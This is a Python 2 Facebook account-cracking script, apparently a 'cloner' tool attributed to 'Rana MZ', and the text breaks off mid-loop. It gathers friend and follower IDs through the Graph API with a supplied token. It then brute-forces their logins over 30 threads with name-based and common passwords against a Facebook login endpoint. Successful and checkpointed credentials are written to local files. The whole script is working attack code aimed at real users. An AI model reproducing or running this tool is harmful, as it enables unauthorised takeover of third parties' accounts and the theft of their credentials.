try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')

agents = [
 'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
birth = [
 '001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """


\033[1;31mo--o    O  o   o   O      o   o o---o 
\033[1;32m|   |  / \ |\  |  / \     |\ /|    /  
\033[1;37mO-Oo  o---o| \ | o---o    | O |  -O-  
\033[1;32m|  \  |   ||  \| |   |    |   |  /    
\033[1;31mo   o o   oo   o o   o    o   o o---o                        
\033[1;37m   {NAM TU SUNA HUGA}
                                 
\033[1;37m    ||||||||||||||||||||| 
\033[1;32m    Author iZ : Rana MZ
\033[1;32m    Facebook : Rana MZ
\033[1;32m    Youtube   : Rana MZ
\033[1;32m    Author2 iZ : Sunny              
\033[1;37m    |||||||||||||||||||||
\033[1;31m        =====
\033[1;31m        NOtE :
\033[1;31m        =====
 \033[1;32m      ==================
\033[1;33m       DONt TRY TO COPY ME
\033[1;33m       BECz itz iMPOSSiBLE
\033[1;32m       ==================
"""
def main():
    os.system('clear')
    print logo
    print ''
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print '      \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ''
    print ' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CLONING'
    print ''
    os.system('xdg-open https://youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw')
    log_sel()


def log_sel():
    select = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Choose Option : \x1b[0;93m')
    if select == '1':
        login()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def login():
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print '      \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print ''
        print ' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m LOGIN WITH TOKEN'
        print ''
        log_select()


def log_select():
    global token
    sel = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Choose Option : \x1b[1;93m')
    if sel == '1':
        log_fb()
    elif sel == '2':
        token()
    elif sel == '3':
        ran()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def token():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print '         \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Login Facebook Token \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print ''
        token = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Need Token : \x1b[1;93m')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print ''
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Active Token : \x1b[1;93m' + name
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ''
    print ' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m CRACK AUTO PASS'
    print ' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CRACK CHOICE PASS'
    print ' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m BACK'
    print ''
    menu_option()


def menu_option():
    select = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Choose Option : \x1b[0;92m')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print '      \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ''
    print ' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m CRACK PUBLIC ID'
    print ''
    crack_select()


def crack_select():
    select = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Choose Option : \x1b[0;93m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m6\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m7\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m8\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m9\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m10\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to next')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL IDs : ' + str(len(id))
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START PUBLIC ID CRACKING...'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m ON OFF FLIGHT MODE IF NO RESULT'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP THIS PROSSES CTRL+Z'
    print 47 * '\x1b[1;91m-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('niki.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('niki.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('nikiok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('nikicp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('nikiok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('nikicp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = 'khan123'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('nikiok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('nikicp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = '445566'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('nikiok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('nikicp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 47 * '\x1b[1;91m-'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m THE PROCESS HAS BEEN COMPLETED'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CP ID CHECK 7-8 DAYS AFTER'
    print 47 * '\x1b[1;91m-'
    print ''
    print ''
    raw_input('\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press enter to back ')
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print '      \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ''
    print ' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m CRACK PUBLIC ID'
    print ' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CRACK FOLLOWERS'
    print ' \x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;92m BACK'
    print ''
    choice_select()


def choice_select():
    select = raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Choose option : \x1b[0;93m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print '     \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print ''
        pass1 = raw_input(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass2 = raw_input(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass3 = raw_input(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass4 = raw_input(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass5 = raw_input(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass6 = raw_input(' \x1b[1;91m[\x1b[1;92m6\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass7 = raw_input(' \x1b[1;91m[\x1b[1;92m7\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        print 47 * '\x1b[1;91m-'
        print ''
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print '      \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m 5 UID & FOLLOWING ID CLONER \x1b[1;92m[\x1b[1;91m*\x1b[1;92m]\x1b[1;91m'
        print 47 * '\x1b[1;92m\xe2\x95\x90'
        print ''
        pass1 = raw_input(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass2 = raw_input(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass3 = raw_input(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass4 = raw_input(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass5 = raw_input(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass6 = raw_input(' \x1b[1;91m[\x1b[1;92m6\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        pass7 = raw_input(' \x1b[1;91m[\x1b[1;92m7\x1b[1;91m]\x1b[1;92m Password : \x1b[1;93m')
        print 47 * '\x1b[1;91m-'
        print ''
        idt = raw_input(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]\x1b[1;92m Input ID : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
